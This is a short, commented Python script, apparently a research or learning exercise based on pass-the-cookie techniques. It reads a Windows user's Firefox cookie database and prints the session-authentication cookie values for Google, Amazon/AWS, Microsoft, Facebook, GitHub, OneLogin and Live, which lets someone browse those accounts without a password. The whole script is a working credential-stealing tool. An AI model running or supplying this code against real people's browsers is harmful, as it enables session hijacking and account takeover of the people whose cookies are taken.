# This script takes advantage of Web Session cookies which store authentication information (enabling one to seamlessly browse through sites,
# because the cookie maintains authority on websites without having to login per user transaction). 
# This script specifically works with Mozilla Firefox's cookie repository.
# It accesses the cookie database and pulls out authentication tokens, so one can browse even without a password.

import sqlite3,os

profile = "jpb273b6.default-release"
firefoxPath = os.path.join( "C:\\Users\\hepos\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",profile,"cookies.sqlite")
# firefoxPath is the default location for Firefox's cookie storage, and "profile" here is an example of a user profile found there.

conn = sqlite3.connect(firefoxPath)
c = conn.cursor()
c.execute("SELECT * FROM moz_cookies")
data = c.fetchall()
# Uses Python's SQL functionality to get all the cookie information from the folder in Firefox specified above.

cookies = {
    ".amazon.com": ["aws-userInfo", "aws-creds"],
    ".google.com": ["OSID", "HSID", "SID", "SSID", "APISID", "SAPISID", "LSID"],
    ".microsoftonline.com": ["ESTSAUTHPERSISTENT"],
    ".facebook.com": ["c_user","cs"],
    ".onelogin.com": ["sub_session_onelogin.com"],
    ".github.com": ["user_session"],
    ".live.com": ["RPSSecAuth"],
}
# Using https://embracethered.com/blog/posts/passthecookie/ for research, this dictionary contains names of cookies that store
# authentication information, and the names of the keys for the useful authentication information.

for cookie in data:
    for domain in cookies:
        if cookie[4].endswith(domain) and cookie[2] in cookies[domain]:
            print("%s %s %s" % (cookie[4], cookie[2],cookie[3]))
# Taking advantage of knowledge of the structure of Mozilla's cookie database stored in one's browser,
# these loops check the cookie information pulled from the user's browser against the cookies known to store valuable auth info,
# and then print the URL, cookie name, and value.
